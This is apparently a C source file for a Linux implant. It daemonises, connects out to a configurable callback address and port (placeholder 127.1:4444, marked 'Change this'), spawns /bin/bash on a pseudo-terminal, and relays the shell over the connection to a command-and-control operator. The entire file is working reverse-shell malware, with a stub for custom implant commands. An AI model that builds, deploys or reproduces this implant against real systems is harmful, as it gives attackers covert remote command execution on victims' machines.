#include <arpa/inet.h>
#include <netdb.h>
#include <pty.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <unistd.h>
#include <termios.h>
#include <sys/epoll.h>
#include <sys/wait.h>

#define INFINITE_TIMEOUT -1
#define CALLBACK_IP "127.1" //Change this
#define CALLBACK_PORT 4444 //Change this
#define BUFFER_SIZE 1024
#define CHILD 0


/*
* Function: max
* -------------
* Determines the largest of two values (integers)
*
* val_one: first integer
* val_two: second integer
*
* returns: The largest of two integers, val_one and val_two 
*/
int max(int val_one, int val_two)
{
    return val_one > val_two ? val_one : val_two;
}


/*
* Function: shell_setup
* --------------------
* Creates a socket pair to maintain communication with the spawned
* shell. This will allow for data interception so that custom actions
* and commands can be executed by the implant, or passed to the shell
* as appropriate.

* returns: file descriptor for sending to // receiving from the shell's
* stdin/stdout 
*/
int shell_setup()
{
    pid_t pid = -1;
    //int sp[2] = {0, 0};
    int master = -1;

    /*if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
        perror("failed to create interpreter socket pair");
    }*/

    if ((pid = forkpty(&master, NULL, NULL, NULL)) < 0)
    {
        perror("fork");
    }

    if (pid == CHILD)
    {
        //close(sp[1]);
        //dup2(sp[0], STDIN_FILENO);
        //dup2(sp[0], STDOUT_FILENO);
        //dup2(sp[0], STDERR_FILENO);

        system("/bin/bash");
    }

    /*if (dup2(master, sp[1]) < 0 )
    {
        perror("dup2");
    }*/

    //close(sp[0]);

    //return sp[1];
    return master;
}


/*
* Function: exec_command
* ---------------------
* WIP: Currently only checks for "test" command
* Should eventually check for commands in hashmap
* to determine if command is meant to be executed
* by the implant or shell
* Performs custom operations if appropriate 
*
* command: user entered data to check
* result: output of custom command if one is executed
*
* returns: boolean representing whether commands is 
* known or not
*/
bool exec_command(const char *command, char *result)
{
    const char *check = "test";
    const char *match_output = "matching command found!\n"; 
    if (!strncmp(command, check, strlen(check)))
    {
        strncpy(result, match_output, BUFFER_SIZE); 
        return true;
    }
    else
    {
        return false;
    }
}


int comm_c2(int sockfd, int master)
{
    const int max_events = 5;
    int epfd, nfds, nb;
    struct epoll_event ev[2], events[5];
    unsigned char buf[BUFFER_SIZE];
    
    epfd = epoll_create(2);
    ev[0].data.fd = sockfd;
    ev[0].events = EPOLLIN | EPOLLET;
    epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev[0]);
    
    ev[1].data.fd = master;
    ev[1].events = EPOLLIN | EPOLLET;
    epoll_ctl(epfd, EPOLL_CTL_ADD, master, &ev[1]);
    
    for(;;)
    {
        nfds = epoll_wait(epfd, events, max_events, INFINITE_TIMEOUT);
        for(int i = 0;i < nfds; i ++)
        {
            if(events[i].data.fd == sockfd)
            {
                nb = read(sockfd, buf, BUFFER_SIZE);
                if(!nb)
                    goto __LABEL_EXIT;
                write(master, buf, nb);
            }
            if(events[i].data.fd == master)
            {
                nb = read(master, buf, BUFFER_SIZE);
                if(!nb)
                    goto __LABEL_EXIT;
                write(sockfd, buf, nb);                                                              
            }
        }
    }
    __LABEL_EXIT:
        close(sockfd);
        close(master);
        close(epfd);
    
    return 0;
 
}

void sig_child(int signo)
{
    int status;
    pid_t pid = wait(&status);
    exit(0);
}

int main()
{
    struct sockaddr_in c2addr;
    int c2_fd = 0;
    int shell_pipe = 0;

    int pid = fork();
    if (pid < 0)
        perror("fork");
    else if (pid > 0)
        return 0;

    if ((c2_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed socket init");
        exit(1);
    }

    memset(&c2addr, 0, sizeof(c2addr));
    c2addr.sin_family = AF_INET;
    c2addr.sin_addr.s_addr = inet_addr(CALLBACK_IP);
    c2addr.sin_port = htons(CALLBACK_PORT); 

    //c2 manages the agent, connecting it to operators
    if (connect(c2_fd, (struct sockaddr*)&c2addr, sizeof(c2addr)) != 0)
    {
        perror("failed to connect");
        exit(2);
    }

    signal(SIGCHLD, sig_child);

    shell_pipe = shell_setup();

    for(int i = 0; i < 3; i++)
        dup2(c2_fd, i);

    comm_c2(c2_fd, shell_pipe);

    return 0;
}